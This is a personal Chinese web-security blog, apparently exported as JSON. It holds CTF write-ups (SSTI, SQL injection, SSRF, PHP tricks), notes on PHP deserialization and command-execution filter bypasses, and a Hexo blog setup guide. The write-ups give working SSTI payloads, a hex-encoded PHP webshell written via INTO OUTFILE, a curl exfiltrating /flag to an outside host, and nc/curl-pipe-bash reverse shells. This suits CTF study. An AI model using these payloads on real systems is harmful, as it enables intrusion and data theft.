[{"title":"轩辕杯_web_wp","path":"/2025/05/21/轩辕杯wp/","content":"ezflask打开提示注入 输入 7*7 ssti注入 测试了一下，发现点,popen被过滤，我们使用中括号加Unicode编码绕过，然后执行命令的时候，发现flag还有cat也被过滤了，可以使用其他读取文件的命令，比如sort加正则来读取，也可以unicode编码绕过 ()[__class__][__base__][__subclasses__]()[133][__init__][__globals__][\\u0070\\u006f\\u0070\\u0065\\u006e](sort /f*)[read]() ()[__class__][__base__][__subclasses__]()[133][__init__][__globals__][\\u0070\\u006f\\u0070\\u0065\\u006e](\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067)[read]() ezrce 代码审计 首先需要num传入数字大于1234即可 然后就是call_user_func()回调函数吧 然后中间有个waf，我们可以很容易发现，这是一个遍历数组来找的，而不是正则匹配， 我们直接使用命名空间绕过即可 GET?num=12345POSTnew=\\systemstar=cat /flag ezsql1.0测试一下发现过滤了空格，使用%09绕过即可 然后使用into output来写码，刚开始没有试出来select被删了，使用的是order by 传码 1%09order%09by%092%09into%09outfile%09/var/www/html/aaa.php%09lines%09terminated%09by%090x3c3f70687020406576616c28245f504f53545b2773275d293f3e 我们直接蚁剑连接 在var里面找到db.sql 找到flag base解码后得到flag 然后这题其实只是删掉了一个select，双写就行 也是直接传码 1%09union%09selselectect%090x3c3f70687020406576616c28245f504f53545b2761275d293f3e23,2,3%09into%09outfile%09/var/www/html/aaaa.php 然后蚁剑连接得到flag ez_web1 打开是一个登录界面，查看元素发现提示 知道用户名为fly233，并且是一个非常简单的9位数密码，直接猜测123456789登录进去 进去之后有一个可以读取文件的，然后有几篇文章，提示是jwt，查看cookie，发现 token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZseTIzMyJ9.inCoyLUdTLkcp-ZHLvIyBEa27Glfu-jHBpWdh_DpWrA; 确定应该是jwt伪造 然后这个题还有一个可以造成任意文件读取 我们利用路径穿越可以直接读取环境变量，得到key 但是这个key不对，不知道是我找错了还是什么，我验证失败了 然后我又读取了proc1environ，发现flag在这里面 感觉这应该是非预期 ezssrf1.0打开代码 是url参数，代码审计发现，需要host为null，然后是http开头的， 我们只需要少一个/即可使host为空，然后在后面接flag，得到flag的位置 然后继续访问 拿到flag ezjs打开是一个跳一跳 查看源代码，找到main.js 打开看到代码 let game = new Game()game.init()let current_score = document.getElementsByClassName(current-score)[0]let mask = document.getElementsByClassName(mask)[0]let score = mask.getElementsByClassName(score)[0]let restart = mask.getElementsByClassName(restart)[0]game._addSuccessFn(function (scoreNow) current_score.innerHTML = scoreNow if (scoreNow === 100000000000) fetch(getflag.php, method: POST, headers: Content-Type: application/x-www-form-urlencoded, , body: score= + scoreNow ) .then(response = response.text()) .then(data = alert(鎭枩浣狅紒flag鏄細 + data); ) .catch(error = console.error(閿欒:, error); ); )game._addFailedFn(function () mask.style.display = flex score.innerText = game.score)restart.addEventListener(click, function () mask.style.display = none game._restart()) 根据这个代码可知，需要getflag.php,然后score100000000000，强相等即可输出flag 签到 第一关，需要post传bnew,GET传awelcome,cookies里面传一个staradmin即可进行下一关 第二关，弱相等 ?password=2025a 即可通过 第三关 代码审计 ?phperror_reporting(0);// 判断 Referer 是否符合$referer = isset($_SERVER[HTTP_REFERER]) ? $_SERVER[HTTP_REFERER] : ;if (strpos($referer, secretcode) !== false) // 进一步要求POST参数 if (isset($_POST[key]) $_POST[key] === ctfpass) echo file_get_contents(./xixi.txt); else echo Referer对了，但是POST参数呢？; else echo 你缺少正确的Referer头~;? 发现有个txt文件，直接访问即可下一关 第四关，提示get和post都不行，还需要identityn1c3用户，后面一个好改，我们直接改user-agent即可 前面一个我们查看源代码发现提示 抓包，修改get为HEAD 即可 第五关 将js代码放到控制台，得到key 第六关 输入命令，但是有过滤 使用sort加正则即可绕过,得到flag sort /f*","tags":["web","wp"],"categories":["wp"]},{"title":"ctfshow—web ssti 361-372","path":"/2025/04/29/ctfshow_web-ssti/","content":"ctfshow_web-ssti （361~372）web 361首先，题目提示，名字就是考点，所以应该是需要我们传一个name的参数 然后就是检查是什么模板 然后找到可以注入的模块，这里我找到的是os._wrap_close在132,找模块的数字我们可以使用python代码来跑 直接些payload ?name=.__class__.__base__.__subclasses__()[132].__init__.__globals__[popen](cat /flag).read() web362首先题目提示有过滤，然后其他没变 测试发现过滤了一些数字，如3还有2，这样子我们os._wrap_close这个就不能用了，我们可以去找其他模板，如_frozen_importlib_external.FileLoader这个模块，这个模块在94，没有被过滤，这个模块可以使用内建函数eval执行命令，我们直接构造payload（有很多可以这样做的模块，我们可以用python脚本，去找） payload ?name=().__class__.__base__.__subclasses__()[94].__init__.__globals__[__builtins__][eval](__import__(os).popen(cat /flag).read()) web363题目还是提示有过滤，试了一下发现过滤了单双引号，我们测试过滤了什么可以一部分一部分的输命令，就可以知道了，我们直接使用request来绕过过滤单双引号 payload ().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.args.k).read()k=ls web364和上一题增加了对args的过滤，我们使用request.cookies即可绕过 payload ().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.cookies.k).read() web365增加了对中括号的过滤，我们可以使用pop()或者__getitem__魔术方法来进行绕过 payload ?name=().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(request.cookies.k).read() web366增加了对下划线的过滤，我们可以使用过滤器attr()和request来绕过 payload url ?name=()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.x)(request.cookies.z)|attr(request.cookies.r)()cookiea=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;x=popen;z=cat /flag;r=read web367过滤了os，用上一题的脚本即可 web 368又过滤了双大括号，使用%print%再配合上一个payload即可 payload url%print ()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.x)(request.cookies.z)|attr(request.cookies.r)()%cookiesa=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;x=popen;z=cat /flag;r=read web 369又过滤了request，重新构造payload 用拼接来绕过 %set pop=dict(pop=a)|join%% set s=dict(aaaaaa=a)|join|length*dict(aaaa=a)|join|length% //s=24% set w=dict(aaaaaa=a)|join|length*dict(aaa=a)|join|length% //w=18% set v=dict(aaaaaaaaaa=a)|join|length*dict(aaaaa=a)|join|length-dict(aaa=a)|join|length% //v=47% set xhx=(|select()|string()|list|attr(pop)(s))% //xhx=_% set kg=(self|string()|list|attr(pop)(w))% //kg=空格% set glo=(xhx,xhx,dict(glo=a,bals=b)|join,xhx,xhx)|join%% set g=dict(ge=a,t=b)|join%% set ch=dict(ch=a,r=b)|join%% set bu=(xhx,xhx,dict(buil=a,tins=b)|join,xhx,xhx)|join%% set c=lipsum|attr(glo)|attr(g)(bu)|attr(g)(ch)%% set o=dict(o=a,s=a)|join%% set po=dict(po=a,pen=a)|join%% set r=dict(re=a,ad=b)|join%% set a=(dict(ca=a,t=b)|join,kg,c(v),dict(fl=a,ag=b)|join)|join% //c(v)=/lipsum|attr(glo)|attr(g)(o)|attr(po)(a)|attr(r)() web370过滤了数字，我上一个脚本就已经绕过了数字，直接使用上一题脚本即可 web371过滤了print，使用curl外带 跑chr字符的脚本 def half2full(half): full = for ch in half: if ord(ch) in range(33, 127): ch = chr(ord(ch) + 0xfee0) elif ord(ch) == 32: ch = chr(0x3000) else: pass full += ch return fullstring = input(你要输入的字符串：)result = def str2chr(s): global result for i in s: result += c(+half2full(str(ord(i)))+)%2bstr2chr(string)print(result[:-3]) payload %set pop=dict(pop=a)|join%% set s=dict(aaaaaa=a)|join|length*dict(aaaa=a)|join|length%% set w=dict(aaaaaa=a)|join|length*dict(aaa=a)|join|length%% set v=dict(aaaaaaaaaa=a)|join|length*dict(aaaaa=a)|join|length-dict(aaa=a)|join|length%% set xhx=(|select()|string()|list|attr(pop)(s))%% set kg=(self|string()|list|attr(pop)(w))%% set glo=(xhx,xhx,dict(glo=a,bals=b)|join,xhx,xhx)|join%% set g=dict(ge=a,t=b)|join%% set ch=dict(ch=a,r=b)|join%% set bu=(xhx,xhx,dict(buil=a,tins=b)|join,xhx,xhx)|join%% set c=lipsum|attr(glo)|attr(g)(bu)|attr(g)(ch)%% set o=dict(o=a,s=a)|join%% set po=dict(po=a,pen=a)|join%% set r=dict(re=a,ad=b)|join%% set a=c(９９)%2bc(１１７)%2bc(１１４)%2bc(１０８)%2bc(３２)%2bc(４５)%2bc(７０)%2bc(３２)%2bc(９７)%2bc(９７)%2bc(９７)%2bc(６１)%2bc(６４)%2bc(４７)%2bc(１０２)%2bc(１０８)%2bc(９７)%2bc(１０３)%2bc(３２)%2bc(１０４)%2bc(１１６)%2bc(１１６)%2bc(１１２)%2bc(５８)%2bc(４７)%2bc(４７)%2bc(５５)%2bc(９７)%2bc(１０５)%2bc(１１２)%2bc(５１)%2bc(１０３)%2bc(１０９)%2bc(５６)%2bc(９８)%2bc(１１７)%2bc(１１６)%2bc(１１６)%2bc(１０７)%2bc(５６)%2bc(１１４)%2bc(１１９)%2bc(９８)%2bc(１１４)%2bc(５５)%2bc(１０３)%2bc(１１３)%2bc(１１６)%2bc(１１９)%2bc(１０５)%2bc(９７)%2bc(５７)%2bc(１０３)%2bc(４８)%2bc(５２)%2bc(１１３)%2bc(１１５)%2bc(１０２)%2bc(４６)%2bc(１１１)%2bc(９７)%2bc(１１５)%2bc(１１６)%2bc(１０５)%2bc(１０２)%2bc(１２１)%2bc(４６)%2bc(９９)%2bc(１１１)%2bc(１０９)%% if lipsum|attr(glo)|attr(g)(o)|attr(po)(a)|attr(r)()%aaa%endif% web 372过滤了count，没什么影响貌似，上一个脚本依旧可以","tags":["web","wp","ssti"],"categories":["wp"]},{"title":"php反序列化","path":"/2025/04/07/php反序列化/","content":"程序开发：面向过程面向对象面向过程面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。 面向对象面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。 对象的三个特征：对象的行为，对象的形态，对象的表示类的定义 类的结构类：定义类名、定义成员变量（属性）、定义成员函数（方法） 1 class Class_Name2 //成员变量声明3 //成员函数声明4 类的内容1 class hero 定义类（类名）2 var $name; //声明成员变量3 var $sex; var为一种修饰符4 function jineng($var1) //声明成员函数（方法）5 echo $this-name; 使用预定义$this调用成员变量6 echo $var1; 成员函数传参$var1可直接调用 7 8 1.反序列化之后的内容为一个对象;2.反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关;3.反序列化不触发类的成员方法；需要调用方法后才能触发;反序列化的作用 将序列化后的参数还原成实例化的对象。 魔术方法什么是魔术方法一个预定义好的，在特定情况下自动触发的行为方法。 魔术方法的作用反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控;通过更改这个值（字符串），得到所需要的代码;通过调用方法，触发代码执行。 魔术方法在特定条件下自动调用相关方法，最终导致触发代码。 _construct()构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法； 实例化对象时触发构造函数construct() 触发时机：实例化对象功能：提前清理不必要内容参数：非必要返回值： __destruct()析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。 实例化对象结束后，代码运行完会销毁，触发析构函数destruct() 在序列化过程中不会触发， 在反序列化过程中会触发； 反序列化得到的是对象，用完后会销毁,触发析构函数destruct() 触发时机：对象引用完成，或对象被销毁功能参数：返回值： __sleep()序列化serialize()函数会检查类中是否存在一个魔术方法sleep(0。 如果存在，该方法会先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。 触发时机：序列化serialize()之前功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。参数：成员属性返回值：需要被序列化存储的成员属性 __wakeup()unserialize()会检查是否存在一个wakeup()方法。如果存在，则会先调用、wakeup()方法，预先准备对象需要的资源。预先准备对象资源，返回od,常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。 触发时机：反序列化unserialize()之前功能：参数：返回值：_wakeup(0在反序列化unserialize()之前destruct(()在反序列化unserialize()之后 __toString()表达方式错误导致魔术方法触发 常用于pop链构造 触发时机：把对象被当成字符串调用功能：参数：返回值： 调用对象可以使用print_r或者var_dump如果使用echo或者print.只能调用字符串的方式去调用对象即把对象当成字符串使用，此时自动触发toString() __invoke()格式表达错误导致魔术方法触发 触发时机：把对象当成函数调用功能：参数：返回值： __call()[触发时机：调用一个不存在的方法功能：参数：2个参数传参$arg1,$arg2返回值：调用的不存在的方法的名称和参数]()$arg1,调用的不存在的方法的名称，$arg2,调用的不存在的方法的参数， callStatic()触发时机：静态调用或调用成员常量时使用的方法不存在功能：参数：2个参数传参Sarg1,5arg2返回值：调用的不存在的方法的名称和参数 get()触发时机：调用的成员属性不存在功能参数：传参Sarg1返回值：不存在的成员属性的名称 set()触发时机：给不存在的成员属性赋值功能参数：传参$arg1,$arg2返回值：不存在的成员属性的名称和赋的值 isset()触发时机：对不可访问属性使用isset()或empty()时，_isset()会被调用。功能：参数：传参$arg1返回值：不存在的成员属性的名称 unset()触发时机：对不可访问属性使用unset()时功能：参数：传参$arg1返回值：不存在的成员属性的名称 clone()触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法clone()功能参数：返回值： 魔术方法触发前提：魔术方法所在类（或对象）被调用POP链在反序列化中，我们能控制的数据就是对象中的属性值（成员变量）所以在PHP反序列化中有一种漏洞利用方法叫面向属性编程，即POP(Property Oriented Programming).POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload。 POC编写POC（全称：Proof of concept)中文译作慨念验证。在安全界可以理解成漏洞验证程序。PoC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。 字符串逃逸基础反序列化分隔符反序列化以;结束，后面的字符串不影响正常的反序列化 属性逃逸一般在数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸。 是字符还是格式符号，是由字符串长度来判断的在前面字符串没有问题的情况下，;}是反序列化结束符后面的字符串不影响反序列化结果成员属性数量一致,成员属性名称长度一致，内容长度一致 反序列化字符串减少逃逸：多逃逸出一个成员属性第一个字符串减少，吃掉有效代码，在第二个字符串构造代码 反序列化字符串增多逃逸：构造出一个逃逸成员属性第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性反序列化漏洞CVE-2016-7124(PHP55.6.25;PHP77.0.10)漏洞产生原因如果存在wakeup方法，调用unserilize()方法前则先调用wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过wakeup()的执行 序列化引用构造序列化字符串，让$enter的值引用$secret的值 session反序列化漏洞当session start()被调用或者php.ini中session.auto start为1时PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp)。 存取数据的格式有多种，常用的有三种漏洞产生：写入格式和读取格式不一致 存储数据的常用三种格式 处理器 对应的储存格式 php 键名+竖线+经过serialize()函数序列化处理的值 php_seialize(php=5.54) 经过serialize()函数序列化处理的数组 php_binary 键名的长度对应的ASCII字符+键名+经过serialize()函数反序列处理的值 PHP session反序列化漏洞当网站序列化并存储Session,与反序列化并读取Session的方式不同，就可能导致session反序列化漏洞的产生。 phar反序列化漏洞JAR是开发Java程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。而PHAR(“Php ARchive”)是PHP里类似于JAR的一种打包文件。对于PHP5.3或更高版本，Phar后缀文件是默认开启支持的，可以直接使用它。 phar结构stub phar文件标识，格式为Xxx?php xxx;HALT_COMPiLER0;?;(头部信息)manifest压缩文件的属性等信息，以序列化存储；contents压缩文件的内容；signature签名，放在文件末尾； Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化","tags":["web","php反序列化"],"categories":["web"]},{"title":"hexo和github搭配搭建个人blog","path":"/2025/04/07/搭blog/","content":"首先科学上网，很多都是国外的，需要科学上网 1、node环境 首先，安装 nodejs， 因为Hexo是基于 Node.js 驱动的一款博客框架。 ⭐nodejs下载地址 没有科学上网的可以换源使用淘宝源#最新地址 淘宝 NPM 镜像站喊你切换新域名啦!npm config set registry https://registry.npmmirror.com 查看镜像使用状态 npm config get registry 安装cnpm npm install -g cnpm --registry=https://registry.npmmirror.com# 注册模块镜像npm set registry https://registry.npmmirror.com // node-gyp 编译依赖的 node 源码镜像 npm set disturl https://npmmirror.com/dist // 清空缓存 npm cache clean --force // 安装cnpm npm install -g cnpm --registry=https://registry.npmmirror.com 2、git 环境 然后，安装git, 一个分布式版本控制系统，用于项目的版本控制管理，作者是 Linux 之父。 ⭐Git（官网） 安装过程一路next就行（安装路径可改） 3、注册一个github的仓库仓库的取名格式：用户名.github.io 这个是以后的访问名 本地配置安装Hexo在磁盘创建一个文件来存放Github本地仓库文件的目录blog 1.先安装hexo npm install hexo-cli -g 找到刚刚创建的目录，进入终端执行 hexo init myblogcd myblognpm install 成功显示这个 打开myblog文件夹，里面_config.yml 存放的是博客配置信息， source/_posts 是存放文章的地方 在本地运行 hexo cleanhexo ghexo s 出现这个代表可以通过 http://localhost:4000/ 访问blog 接下来设置ssh先打开终端win+x选择终端， 然后输入以下来生成sshkey ssh-keygen -t rsa -C 注册github时的邮箱地址 接着进入.ssh文件夹找到公钥，就是有pub后缀的这个要放到github里 C:\\Users\\用户名\\.ssh 找到这两个 将key配置到GitHub中在GitHub主页的头像下找到seething 然后点击SSH and GPG keys，点击New SSH key 将刚刚在.ssh目录下所复制的id_rsa.put文件中的信息复制进key(注意空格) 名字自己喜欢什么取什么 然后验证输入命令 ssh -T git@github.com 接着在本地绑定与Github的用户名和邮箱 输入命令 git config --global user.name “注册时用户名”git config --global user.email “注册时邮箱” 首先找到之前创建仓库生成的Github仓库Http或SSH地址 推荐使用ssh 因为据说http后期会有bug 然后打开blog文件夹下的_config.yml文件 翻到最底下找到deploy改成这种 deploy: type: git repository: git@github.com:用户名/用户名.github.io.git 或者https://github.com/用户名/用户名.github.io.git （git开头是ssh，https开头是http） branch: main 安装git插件 npm install hexo-deployer-git --save 最后先预览 hexo s 然后生成一遍文件 hexo g 然后可以部署blog hexo d 然后就可以通过 用户名.github.io 来访问个人blog 主题看自己喜好，我用的是anzhiyu下载主题git clone -b main https://github.com/anzhiyu-c/hexo-theme-anzhiyu.git themes/anzhiyu 应用主题打开 Hexo 根目录下的 config.yml, 找到以下配置项，把主题改为anzhiyu 主题使用手册 https://docs.anheyu.com/","tags":["hexo"],"categories":["blog"]},{"title":"php命令执行.","path":"/2025/04/07/php命令执行/","content":"1.通配符？绕过*通配符是一种特殊语句，主要有问号(？)和星号(*)，用来模糊搜索文件。?:在linux里面可以进行代替字母。？仅代表单个字符串，但此单字必须存在。*:在linux里面可以进行模糊匹配。*可以代表任何字符串。 2.单引号、双引号绕过空字符 3.反斜杠 \\ 绕过把特殊字符去掉功能性，单纯表示为字符串 *4.特殊变量：$1 到$9、$@和$等输出为空 5.内联执行自定义字符串，再拼接起来a=f;d=ag;c=l;cat aScSd.txt表示cat flag.txt 6.利用linux中的环境变量使用环境变量里的字符执行变量 绕过空格过滤的方法$IFS$9IFS$IFS$IFS$IFS$1 //$1改成$加其他数字貌似都行IFS cat,flag.php //用逗号实现了空格功能，需要用括起来%20 (space)%09 (tab)X=$cat\\x09./flag.php;$X （\\x09表示tab，也可以用\\x20） 读取文件1.tac:反向显示；2.more:一页一页的显示档案内容；3.less:与more类似；4.tail:查看末尾几行；5.nl:显示的时候，顺便输出行号：6.od:以二进制的方式读取档案内容；(?cmd=passthru(od -A d-c fla\\g.ph\\p);)7.xxd:读取二进制文件：8.sort:主要用于排序文件；9.uniq:报告或删除文件中重复的行；10.file-f:报错出具体内容；11.grep:在文本中查找指定的字符串； 编码绕过 base64绕过 利用管道输出符，将前面的当作后面的参数来执行命令 hex编码 道理一样，需要(xxd -r -p)来解码 shellcode编码 道理一样，不需要xxd来解码，只需要printf即可 长度过滤绕过符号和符号1.通过来创建文件 #echo benben a创建文件a,并把字符串benben写入到文件a里；#echo dazhuang a通过来将命令执行结果写入文件会覆盖掉文件原本的内容； 2.通过来追加内容 #echo benben a在原本文件内容后面追加benben 命令换行在没有写完的命令后面” \\ ”，可以将一条命令写在多行 ls-t命令文件默认排序优先级是,符号数字字母 而ls -t 可以将文件名按照时间顺序排列出来（后创建的排在前面） 只能够精确到秒 组合运用 ls -t 命令列出文件名，然后每个文件名按行储存；在创建文件时，加入\\把命令catfag连接起来前面的把后面的实体化变成字符有空格使用双引号包裹可以使用source ./文件,来执行也可以sh执行sh命令是shell命令语言解释器执行命令从标准输入读取或从一个文件中读取。 对命令长度有限制时把一些很短的文件名拼接成可执行命令 创建很短的文件名st按时间顺序列出文件名，按行储存连接换行命令sh从文件中读取命令 dir及*和revdirdir:基本上和ls一样，但有两个好处：一是开头字母是d,这使得它在alphabetical序中靠前；二是按列输出，不换行。 *相等于$(dir *)如果第一个文件名是命令的话就会执行命令,返回执行的结果，之后的文件名作为参数传入。 rev可以反转文件每一行内容 长度限制为7的绕过目标是利用“ ls -t ” 和” “符号还有” \\ “符号来构造nc 192.168.65.128 7777 -e /bin/bash来反弹shell到kali，来得到flag 长度限制为5的绕过无法使用ls -ta命令，需要重新构造ls -ta命令，需要使用””追加符号，创建文件_ 将ls -ta追加到_里面然后使用sh _来执行 而且只能有一个空格文件，我们需要使用在kali中打开web服务并且创建index.html文件，来用于反弹shell index.html内容 nc 192.168.65.128 7777 -e /bin/bash 使用curl命令来获取并利用管道输出符来执行 curl 192.168.65.128 | bash 从而拿到shell得到flag 长度为4的绕过利用追加符号构造ls -tg也不可以需要重新构造，利用dir和*和rev来构造 有一个问题，按照字母排序，但是顺序不满足，所以我们可以在t-前面加h，反转后为-th，不影响命令的执行，但是可以改变排序 此时我们可将内容传输到一个文件使用*v将内容放到u里面 然后可以利用*和rev来把v里面内容反转 先创建一个rev的目录，然后使用*来执行，得到反转后的文件，并放在w里面 无参数命令执行1.请求头绕过(PHP7.3)HTTP请求标头getallheaders()获取所有HTTP请求标头（倒着获取） 用end()包裹getallheaders()可以只获取第一个请求头，即getallheaders()获取的最后一个； 用pos()作用和end()相反 apache_request_headers()功能与getallheaders()相似，适用于Apache服务器 利用全局变量进RCE(php5/7)get_defined_vars() 返回所有已定义变量的值，所组成的数组 返回数组顺序为GET-POST-COOKIE-FILES 利用get_defind_vars()函数来读取变量利用符号加入自己想要执行的命令利用end()和pos()来获取想要执行的命令，最后执行即可 利用session进行无参rcesession_start()1.启动新会话或者重用现有会话，成功开始会话返回true,反之返回false, 通过session_id(session_start())命令可以读取PHPSESSID所以我们可以通过修改phpsessid来执行命令 然后我们可以通过show_source()来读取flag，将phpsession修改为.(文件名)来读取flag 我们也能使用system()来执行命令，不过貌似因为phpsessid中不可以有空格，然后我们需要绕过，我试了几种绕过，目前只有$IFS$9这种可行， 当然我们也可以通过hex2bin()命令进行hex编码来执行命令 使用scandir()进行文件读取只能文件读取 scandir(){类似s,在某文件路径下，把内容以列表形式显示出来} scandir()一列出指定路径中的文件和目录(PHP5,PHP7,PHP8)getcwd()一取得当前工作目录(PHP4,PHP5,PHP7,PHP8)current()一返回数组中的当前值(PHP4,PHP5,PHP7,PHP8)array_reverse()一返回单元顺序相反的数组(PHP4,PHP5,PHP7,PHP8)array_flip()一交换数组中的键和值(PHP4,PHP5,PHP7,PHP8)next()一将数组中的内部指针向前移动PHP4,PHP5,PHP7,PHP8)array_rand一从数组中随机取出一个或多个随机键chdir()一系统调用函数（同cd),用于改变当前工作目录strrev()一用于反转给定的字符串crypt()一用来来加密，目前Linux平台上加密的方法大致有MD5,DES,3DEShebrevc()一把希伯来文本从右至左的流转换为左至右的流。 无字母数字运算绕过异或运算 通过异或来构造绕过过滤 php5可以使用assert来拼接payload来执行命令, ?cmd=%24_%3D!((%25)(%5E%40%5B%5B%40%5B%5C%5C%3B%24__%3D!%2B%2F((%5E~%7B%60%7B%7C%3B%24___%3D%24%24__%3B%24_(%24___%5B_%5D)%3B_=system(ls) php7可以使用 来执行命令，不过没有回显，我们可以通过反弹shell来拿到flag ?cmd=%24_%3D!%2B%2F((%5E~%7B%60%7B%7C%3B%24__%3D%24%24_%3B%60%24__%5B_%5D%60%3B_=nc 192.168.65.128 7777 -e /bin/bash","tags":["php特性","web"],"categories":["web"]},{"title":"ctfshow—web php特性 89—150（慢慢补）","path":"/2025/04/07/ctfshow web(php特性wp)/","content":"ctfshow_web 89-150ctfshow web89?phpinclude(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if(preg_match(/[0-9]/, $num)) die(no no no!); if(intval($num)) echo $flag; 先代码审计 发现有一个preg_match()正则，不能有数字，下面又是一个intval()函数 这个题就是考查数组绕过正则 因为preg_match()函数传入的参数只能是字符串，如果传入数组这种会报错，返回FALSE intval()转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。 空数组返回0 非空返回1 所以我们可以写payload ?num[]=1 即可得到flag ctfshow web90?phpinclude(flag.php);highlight_file(__FILE__);if(isset($_GET[num])) $num = $_GET[num]; if($num===4476) die(no no no!); if(intval($num,0)===4476) echo $flag; else echo intval($num,0); 考察intval函数的使用 intval函数的一些绕过思路 某个数字被过滤时，可以通过使用8进制和10进制绕过 弱类型比较时，可以传入两个空数组，使若比较为true 某个数字被过滤了，可以添加小数位来绕过 当某个数字被过滤了，或者是限制需要有字母，我们可以在数字后面加字母来绕过 使用其他方式替代4476即可，例如使用小数点 ?num=4476.1 ctfshow web91","tags":["php特性","web","wp"],"categories":["wp"]},{"title":"关于我","path":"/about/index.html","content":"你好，我是 txfmk 👋一个普通学生，这是我的个人博客， 目前在学习 Web 安全,打一些CTF 题目，偶尔也写点博客记录学习过程。 🌱 目前关注 Web 安全与渗透测试 CTF 比赛题目复现与总结 🧠 学习理念 听风八百遍，才知是人间。 技术的路上没有捷径，只有不断踩坑和复盘。 📄 版权声明本站所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议，转载请注明出处。 感谢你的来访，愿我们都能在代码的世界里找到属于自己的光。"},{"title":"朋友们","path":"/friends/index.html","content":"江达达"}]